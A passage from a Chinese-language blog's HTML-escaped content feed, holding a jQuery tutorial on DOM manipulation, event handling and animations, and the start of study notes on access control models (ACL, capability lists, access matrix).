container&lt;/p&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="5-appendTo-方法"><a href="#5-appendTo-方法" class="headerlink" title="5. appendTo 方法"></a>5. <code>appendTo</code> 方法</h3><p><code>appendTo</code> 方法用于将元素追加到指定的父元素中。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将新的 &lt;p&gt; 元素追加到 &lt;div id=&quot;container&quot;&gt; 元素的内部末尾</span></span><br><span class="line">$(<span class="string">&quot;&lt;p&gt;New paragraph&lt;/p&gt;&quot;</span>).<span class="title function_">appendTo</span>(<span class="string">&quot;#container&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="6-prependTo-方法"><a href="#6-prependTo-方法" class="headerlink" title="6. prependTo 方法"></a>6. <code>prependTo</code> 方法</h3><p><code>prependTo</code> 方法用于将元素插入到指定的父元素的开头。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code<span class="comment">// 将新的 &lt;p&gt; 元素插入到 &lt;div id=&quot;container&quot;&gt; 元素的内部开头</span></span><br><span class="line">$(<span class="string">&quot;&lt;p&gt;New paragraph at the beginning&lt;/p&gt;&quot;</span>).<span class="title function_">prependTo</span>(<span class="string">&quot;#container&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><h2 id="节点删除"><a href="#节点删除" class="headerlink" title="节点删除"></a>节点删除</h2></li></ul><h3 id="1-remove-方法"><a href="#1-remove-方法" class="headerlink" title="1. remove 方法"></a>1. <code>remove</code> 方法</h3><p><code>remove</code> 方法用于删除被选中的元素及其所有子元素。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code// 删除所有 &lt;p&gt; 元素及其子元素</span><br><span class="line">$(&quot;p&quot;).remove();</span><br></pre></td></tr></table></figure><h3 id="2-empty-方法"><a href="#2-empty-方法" class="headerlink" title="2. empty 方法"></a>2. <code>empty</code> 方法</h3><p><code>empty</code> 方法用于删除被选中元素的所有子元素。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code<span class="comment">// 删除 &lt;div id=&quot;container&quot;&gt; 元素的所有子元素</span></span><br><span class="line">$(<span class="string">&quot;#container&quot;</span>).<span class="title function_">empty</span>();</span><br></pre></td></tr></table></figure><h3 id="3-detach-方法"><a href="#3-detach-方法" class="headerlink" title="3. detach 方法"></a>3. <code>detach</code> 方法</h3><p><code>detach</code> 方法用于从文档中移除被选中的元素，但保留这些元素及其数据。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code<span class="comment">// 从文档中移除所有 &lt;p&gt; 元素，但保留它们的数据</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">detach</span>();</span><br></pre></td></tr></table></figure><h3 id="4-unwrap-方法"><a href="#4-unwrap-方法" class="headerlink" title="4. unwrap 方法"></a>4. <code>unwrap</code> 方法</h3><p><code>unwrap</code> 方法用于移除被选中元素的父元素。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code<span class="comment">// 移除所有 &lt;p&gt; 元素的父元素</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">unwrap</span>();</span><br></pre></td></tr></table></figure><h3 id="5-replaceWith-方法"><a href="#5-replaceWith-方法" class="headerlink" title="5. replaceWith 方法"></a>5. <code>replaceWith</code> 方法</h3><p><code>replaceWith</code> 方法用于替换被选中元素。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code<span class="comment">// 将所有 &lt;p&gt; 元素替换为新的 &lt;div&gt; 元素</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">replaceWith</span>(<span class="string">&quot;&lt;div&gt;New content&lt;/div&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>replaceAll：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/ 将所有 &lt;p&gt; 元素替换为新的 &lt;div&gt; 元素</span><br><span class="line">$(<span class="string">&quot;&lt;div&gt;New content&lt;/div&gt;&quot;</span>).<span class="title function_">replaceAll</span>(<span class="string">&quot;p&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><h2 id="节点包裹"><a href="#节点包裹" class="headerlink" title="节点包裹"></a>节点包裹</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将所有 &lt;p&gt; 元素用 &lt;div&gt; 包裹起来</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">wrap</span>(<span class="string">&quot;&lt;div&gt;&lt;/div&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将每个 &lt;p&gt; 元素的内容用 &lt;span&gt; 包裹起来</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">wrapInner</span>(<span class="string">&quot;&lt;span&gt;&lt;/span&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将所有的 &lt;p&gt; 元素都包裹在一个新的 &lt;div&gt; 中</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">wrapAll</span>(<span class="string">&quot;&lt;div class=&#x27;wrapper&#x27;&gt;&lt;/div&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用已存在的 &lt;div id=&#x27;existing-wrapper&#x27;&gt; 元素将所有的 &lt;p&gt; 元素包裹起来   也可以用选择器选择已经存在的元素</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">wrapAll</span>($(<span class="string">&quot;#existing-wrapper&quot;</span>));</span><br></pre></td></tr></table></figure></li><li><h2 id="样式设置"><a href="#样式设置" class="headerlink" title="样式设置"></a>样式设置</h2></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>JQuery样式设定<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>一共有三种方法：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>.css(样式名，样式值)：样式名css样式名和JS样式名都可用<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>.attr(&quot;class&quot;,&quot;类名&quot;)：更改类名，或.removeAttr(&quot;class&quot;)去除类名<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>.hasClass(),addClass(),.removeClass()用来判断是否具有莫一个类别<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./pic/off.gif&quot;</span> <span class="attr">class</span>=<span class="string">&quot;off&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;board&quot;</span>&gt;</span>我是广告牌<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> node = $(<span class="string">&quot;img&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            node.<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (node.<span class="title function_">hasClass</span>(<span class="string">&quot;off&quot;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">                    node.<span class="title function_">removeClass</span>(<span class="string">&quot;off&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    node.<span class="title function_">attr</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;./pic/on.gif&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    node.<span class="title function_">addClass</span>(<span class="string">&quot;off&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    node.<span class="title function_">attr</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;./pic/off.gif&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    $(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> $h=$(<span class="string">&quot;h1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      $h.<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>,<span class="string">&quot;yellow&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;deeppink&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    $(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> $board = $(<span class="string">&quot;#board&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">toggle</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> ($board.<span class="title function_">hasClass</span>(<span class="string">&quot;active&quot;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">            $board.<span class="title function_">removeClass</span>(<span class="string">&quot;active&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125; </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            $board.<span class="title function_">addClass</span>(<span class="string">&quot;active&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">setInterval</span>(toggle, <span class="number">200</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>登录失焦聚焦：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$(<span class="string">&quot;#password&quot;</span>).<span class="title function_">focus</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> txt_value=$(<span class="variable language_">this</span>).<span class="title function_">val</span>();</span><br><span class="line"><span class="keyword">if</span>(txt_value==<span class="string">&quot;请输入邮箱密码&quot;</span>)&#123;</span><br><span class="line">  $(<span class="variable language_">this</span>).<span class="title function_">val</span>(<span class="string">&quot;&quot;</span>);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li><h2 id="事件绑定"><a href="#事件绑定" class="headerlink" title="事件绑定"></a>事件绑定</h2></li></ul><h3 id="1-基本的事件绑定"><a href="#1-基本的事件绑定" class="headerlink" title="1.  基本的事件绑定"></a>1.  <strong>基本的事件绑定</strong></h3><p>使用 <code>.on()</code> 方法可以绑定一个或多个事件处理程序：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code// 单击事件处理程序</span><br><span class="line">$(&quot;#myButton&quot;).on(&quot;click&quot;, function() &#123;</span><br><span class="line">    alert(&quot;按钮被单击了！&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="2-多个事件绑定"><a href="#2-多个事件绑定" class="headerlink" title="2. 多个事件绑定"></a>2. <strong>多个事件绑定</strong></h3><p>可以同时绑定多个事件处理程序：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code// 同时绑定点击和悬停事件处理程序</span><br><span class="line">$(&quot;#myElement&quot;).on(&#123;</span><br><span class="line">    click: function() &#123;</span><br><span class="line">        alert(&quot;元素被单击了！&quot;);</span><br><span class="line">    &#125;,</span><br><span class="line">    mouseenter: function() &#123;</span><br><span class="line">        alert(&quot;鼠标进入了元素！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="3-事件委托"><a href="#3-事件委托" class="headerlink" title="3. 事件委托"></a>3. <strong>事件委托</strong></h3><p>使用事件委托可以有效地处理动态添加的元素：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code// 使用事件委托处理动态添加的按钮</span><br><span class="line">$(&quot;#parentContainer&quot;).on(&quot;click&quot;, &quot;#dynamicButton&quot;, function() &#123;</span><br><span class="line">    alert(&quot;动态按钮被单击了！&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="4-解除事件绑定"><a href="#4-解除事件绑定" class="headerlink" title="4. 解除事件绑定"></a>4. <strong>解除事件绑定</strong></h3><p>使用 <code>.off()</code> 方法可以解除事件绑定：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code// 解除单击事件绑定</span><br><span class="line">$(&quot;#myButton&quot;).off(&quot;click&quot;);</span><br></pre></td></tr></table></figure><h3 id="5-一次性事件绑定"><a href="#5-一次性事件绑定" class="headerlink" title="5. 一次性事件绑定"></a>5. <strong>一次性事件绑定</strong></h3><p>使用 <code>.one()</code> 方法可以为元素绑定一次性的事件处理程序：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code// 一次性点击事件处理程序</span><br><span class="line">$(&quot;#myButton&quot;).one(&quot;click&quot;, function() &#123;</span><br><span class="line">    alert(&quot;这个事件只会触发一次！&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="6-特定事件"><a href="#6-特定事件" class="headerlink" title="6. 特定事件"></a>6. <strong>特定事件</strong></h3><p>使用 <code>.click()</code>、<code>.hover()</code> 等方法也可以绑定特定的事件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code// 单击事件处理程序</span><br><span class="line">$(&quot;#myButton&quot;).click(function() &#123;</span><br><span class="line">    alert(&quot;按钮被单击了！&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 悬停事件处理程序</span><br><span class="line">$(&quot;#myElement&quot;).hover(</span><br><span class="line">    function() &#123;</span><br><span class="line">        alert(&quot;鼠标进入了元素！&quot;);</span><br><span class="line">    &#125;,</span><br><span class="line">    function() &#123;</span><br><span class="line">        alert(&quot;鼠标离开了元素！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="7-事件对象"><a href="#7-事件对象" class="headerlink" title="7. 事件对象"></a>7. <strong>事件对象</strong></h3><p>事件处理程序可以接收事件对象，以获取更多关于事件的信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code$(&quot;#myElement&quot;).on(&quot;click&quot;, function(event) &#123;</span><br><span class="line">    alert(&quot;鼠标坐标： &quot; + event.pageX + &quot;, &quot; + event.pageY);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这些只是 jQuery 中事件绑定的基本用法。你还可以处理键盘事件、表单事件等，具体取决于你的需求。随着 jQuery 的演变，一些新的方法可能被引入，因此建议查阅 jQuery 的文档以获取最新信息。</p><ul><li><h2 id="事件冒泡阻止"><a href="#事件冒泡阻止" class="headerlink" title="事件冒泡阻止"></a>事件冒泡阻止</h2></li></ul><p><code>event.stopPropagation()</code> 是阻止事件冒泡的 jQuery 方法。它用于防止事件在 DOM 树中向上传播，即阻止它冒泡到父元素或祖先元素。</p><p>当一个元素上触发了某个事件（比如点击事件），事件通常会在 DOM 树中向上传播，从触发事件的元素一直到根元素。这种传播方式被称为事件冒泡。</p><p><code>event.stopPropagation()</code> 的作用是在事件处理程序中调用时停止事件冒泡。例如，假设你有一个按钮的点击事件处理程序，并且按钮是嵌套在一个父元素中，如果你希望点击按钮时不触发父元素的点击事件，可以使用 <code>event.stopPropagation()</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code$(&quot;#myButton&quot;).on(&quot;click&quot;, function(event) &#123;</span><br><span class="line">    alert(&quot;按钮被点击了！&quot;);</span><br><span class="line">    event.stopPropagation(); // 阻止事件冒泡</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(&quot;#parentElement&quot;).on(&quot;click&quot;, function() &#123;</span><br><span class="line">    alert(&quot;父元素被点击了！&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在上述例子中，如果按钮被点击，只会显示 “按钮被点击了！”，而不会触发父元素的点击事件。</p><p>请注意，<code>event.stopPropagation()</code> 只阻止事件在 DOM 树中向上传播，但不会阻止事件的默认行为。如果需要同时阻止事件冒泡和取消事件的默认行为，可以使用 <code>event.preventDefault()</code> 方法。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>阻止事件默认行为<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>比如表单中，我们点击submit按钮，我们要对表单进行检查再提交，但是默认是提交给服务器程序，针对这种问题如何解决<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>event提供了一个方法,event.preventDefault()<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;form1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;usr&quot;</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;usr&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sub&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;msg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      $(<span class="string">&quot;#sub&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> $usrname=$(<span class="string">&quot;#usr&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>($usrname==<span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          $(<span class="string">&quot;#msg&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;&lt;p&gt;用户名不为空&lt;/p&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">          event.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h2 id="动画效果"><a href="#动画效果" class="headerlink" title="动画效果"></a>动画效果</h2></li></ul><h3 id="1-animate"><a href="#1-animate" class="headerlink" title="1. .animate()"></a>1. <code>.animate()</code></h3><p><code>.animate()</code> 方法允许你以自定义的方式操作元素的样式属性，实现平滑的动画效果。可以指定动画的目标属性、持续时间、缓动效果等。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code$(&quot;#myElement&quot;).animate(&#123;</span><br><span class="line">    left: &#x27;250px&#x27;,</span><br><span class="line">    opacity: 0.5,</span><br><span class="line">    height: &#x27;toggle&#x27;</span><br><span class="line">&#125;, 1000, &#x27;swing&#x27;);</span><br></pre></td></tr></table></figure><p>上述代码将元素移动到左边 250 像素，透明度降低到 0.5，高度切换（toggle）。</p><h3 id="2-fadeIn-、-fadeOut-、-fadeToggle"><a href="#2-fadeIn-、-fadeOut-、-fadeToggle" class="headerlink" title="2. .fadeIn()、.fadeOut()、.fadeToggle()"></a>2. <code>.fadeIn()</code>、<code>.fadeOut()</code>、<code>.fadeToggle()</code></h3><p>这些方法用于实现元素的淡入、淡出以及淡入淡出的切换效果。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code$(&quot;#myElement&quot;).fadeIn(1000);    // 淡入</span><br><span class="line">$(&quot;#myElement&quot;).fadeOut(1000);   // 淡出</span><br><span class="line">$(&quot;#myElement&quot;).fadeToggle(1000);// 淡入淡出切换</span><br></pre></td></tr></table></figure><h3 id="3-slideDown-、-slideUp-、-slideToggle"><a href="#3-slideDown-、-slideUp-、-slideToggle" class="headerlink" title="3. .slideDown()、.slideUp()、.slideToggle()"></a>3. <code>.slideDown()</code>、<code>.slideUp()</code>、<code>.slideToggle()</code></h3><p>这些方法用于实现元素的滑动展开、收缩以及滑动展开收缩的切换效果。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code$(&quot;#myElement&quot;).slideDown(1000);    // 滑动展开</span><br><span class="line">$(&quot;#myElement&quot;).slideUp(1000);      // 滑动收缩</span><br><span class="line">$(&quot;#myElement&quot;).slideToggle(1000);  // 滑动展开收缩切换</span><br></pre></td></tr></table></figure><h3 id="4-show-、-hide-、-toggle"><a href="#4-show-、-hide-、-toggle" class="headerlink" title="4. .show()、.hide()、.toggle()"></a>4. <code>.show()</code>、<code>.hide()</code>、<code>.toggle()</code></h3><p>这些方法用于显示、隐藏以及显示隐藏切换元素。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code$(&quot;#myElement&quot;).show(1000);   // 显示</span><br><span class="line">$(&quot;#myElement&quot;).hide(1000);   // 隐藏</span><br><span class="line">$(&quot;#myElement&quot;).toggle(1000); // 显示隐藏切换</span><br></pre></td></tr></table></figure><h3 id="5-stop"><a href="#5-stop" class="headerlink" title="5. .stop()"></a>5. <code>.stop()</code></h3><p><code>.stop()</code> 方法用于停止当前正在运行的动画。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(&quot;#myElement&quot;).stop();</span><br></pre></td></tr></table></figure><p>这只是 jQuery 动画函数的一小部分，它们提供了一种简单而强大的方式来为网页添加交互效果。可以根据具体的需求选择合适的动画函数以及配置参数。</p>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>访问控制</title>
      <link href="/2023/11/10/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
      <url>/2023/11/10/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="一、访问控制模型"><a href="#一、访问控制模型" class="headerlink" title="一、访问控制模型"></a>一、访问控制模型</h1><h2 id="1-访问控制的概念和目标"><a href="#1-访问控制的概念和目标" class="headerlink" title="1. 访问控制的概念和目标"></a>1. 访问控制的概念和目标</h2><ul><li>访问控制：针对越权使用资源的防御措施</li></ul><h2 id="2-访问控制的作用"><a href="#2-访问控制的作用" class="headerlink" title="2. 访问控制的作用"></a>2. 访问控制的作用</h2><ul><li>未授权的访问：非法用户对资源的使用、合法用户对资源的非法使用</li><li>机密性</li><li>完整性</li><li>可用性</li></ul><h2 id="3-概念"><a href="#3-概念" class="headerlink" title="3. 概念"></a>3. 概念</h2><ul><li>subject：用户、程序、进程；接受客体相关数据，改变客体信息</li><li>object：文件、存储介质、程序、进程；提供、驻留信息和数据的实体</li><li>access：对资源的使用 增删查改读</li><li>主客身份可换</li><li>（S，O，A）</li></ul><h2 id="4-授权"><a href="#4-授权" class="headerlink" title="4. 授权"></a>4. 授权</h2><ul><li>规定主体对客体的执行的操作</li><li>标识：访问控制；审计</li></ul><h2 id="5-访问控制模型"><a href="#5-访问控制模型" class="headerlink" title="5.访问控制模型"></a>5.访问控制模型</h2><ul><li><p>对一系列访问控制规则的集合，模型就是用来管理这些规则的；形式化、非形式化</p></li><li><h3 id="组成："><a href="#组成：" class="headerlink" title="组成："></a>组成：</h3><ul><li>AEF：访问控制执行功能</li><li>ADF：访问控制决策功能——访问控制规则政策、上下文信息（地址、时间（QQ异地登陆））</li></ul></li><li><h3 id="访问控制信息（ACI）"><a href="#访问控制信息（ACI）" class="headerlink" title="访问控制信息（ACI）"></a>访问控制信息（ACI）</h3><ul><li>主体访问控制属性</li><li>客体访问控制属性</li><li>访问控制规则政策</li></ul></li><li><h3 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h3></li><li><h3 id="功能实施"><a href="#功能实施" class="headerlink" title="功能实施"></a>功能实施</h3></li></ul><h2 id="6-访问控制表（ACL）"><a href="#6-访问控制表（ACL）" class="headerlink" title="6.访问控制表（ACL）"></a>6.访问控制表（ACL）</h2><ul><li>集中式系统</li><li>访问控制表与客体关联，每个客体都有１个，规定能够访问它的主题和权限</li><li>易于得到对一个客体有权限的主体信息</li><li>主体离开后对其修改很麻烦</li><li>&#x3D;&#x3D;问题&#x3D;&#x3D;：主体客体数量大，影响访问效率</li><li>&#x3D;&#x3D;解决&#x3D;&#x3D;：引入用户组（用户.组.权限（*表示所有））</li></ul><h2 id="7-能力表（CL）"><a href="#7-能力表（CL）" class="headerlink" title="7.能力表（CL）"></a>7.能力表（CL）</h2><ul><li>分布式系统</li><li>与主体关联</li><li>便于得到一个主体的所有访问权限</li><li></li></ul><h2 id="8-访问控制矩阵"><a href="#8-访问控制矩阵" class="headerlink" title="8.　访问控制矩阵"></a>8.　访问控制矩阵</h2><ul><li>一列：ACL</li><li>一行：CL</li></ul><h2 id="9-授权关系表"><a href="#9-授权关系表" class="headerlink" title="9.　授权关系表"></a>9.　授权关系表</h2><p>- </p><h2 id="10-访问控制与安全标签"><a href="#10-访问控制与安全标签" class="headerlink" title="10.访问控制与安全标签"></a>10.访问控制与安全标签</h2><p>- </p><h2 id="11-锁与钥匙"><a href="#11-锁与钥匙" class="headerlink" title="11.　锁与钥匙"></a>11.　锁与钥匙</h2><ul><li>客体有锁</li><li>主体由钥匙</li></ul><h2 id="12、访问控制与其他安全机制的关系"><a href="#12、访问控制与其他安全机制的关系" class="headerlink" title="12、访问控制与其他安全机制的关系"></a>12、访问控制与其他安全机制的关系</h2><ul><li>身份鉴别是前提</li><li>限制用户对数据的访问，实现机密性</li><li>完整性‘可用性</li><li>..</li></ul><h3 id="13、访问控制模型分类"><a href="#13、访问控制模型分类" class="headerlink" title="13、访问控制模型分类"></a>13、访问控制模型分类</h3><ul><li><h4 id="自主访问控制模型（DAC）"><a href="#自主访问控制模型（DAC）" class="headerlink" 